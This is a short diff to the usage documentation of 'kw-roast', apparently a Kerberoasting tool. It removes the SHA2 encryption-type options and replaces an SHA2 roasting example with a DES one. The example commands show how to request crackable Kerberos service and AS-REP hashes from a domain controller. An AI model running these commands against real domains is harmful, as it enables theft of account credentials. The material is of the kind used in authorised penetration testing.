@@ -71,7 +71,7 @@ output:
   -e ETYPE, --enctype ETYPE
                         Encryption type(s) in preference order, repeatable or
                         comma-separated (choices: des-cbc-crc, des-cbc-md5,
-                        rc4, aes128, aes256, aes128-sha2, aes256-sha2;
+                        rc4, aes128, aes256;
                         default: rc4)
   -o FILE, --output FILE
                         Write hashes to file
@@ -100,6 +100,6 @@ kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 --no-preauth vuln_user -t svc_sql
 # Specific target, AES256, John format
 kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass -t MSSQLSvc/db01 -e aes256 --format john
 
-# SHA2 kerberoast (Server 2025)
-kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap -e aes256-sha2
+# DES kerberoast (requires AllowDES on DC)
+kw-roast -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p pass --ldap -e des-cbc-md5
 ```
